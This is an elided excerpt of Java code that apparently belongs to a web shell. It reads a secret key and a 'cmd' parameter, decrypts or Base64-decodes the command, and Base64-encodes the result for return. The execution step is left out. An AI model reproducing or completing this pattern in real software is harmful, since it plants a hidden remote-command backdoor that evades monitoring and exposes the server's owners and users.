                ...
                if (secret_key != null && !(secret_key = secret_key.trim()).equals("")) {
                    ...
                    if (cmd != null && cmd.length() > 0) {
                        try {
                            ...
                            byte[] original = cipher.doFinal(Base64.getDecoder().decode(cmd));
                    ...
                    // base64 decodeBuffer
                    if (cmd != null && cmd.length() > 0) {
                        cmd = new String(Base64.getDecoder().decode(cmd), "UTF-8");
                        ...
                        // base64 result
                        String resValue = Base64.getEncoder().encodeToString(result.toString().getBytes("UTF-8"));
                        resValue = resValue.replace("\n","").replace("\r","");
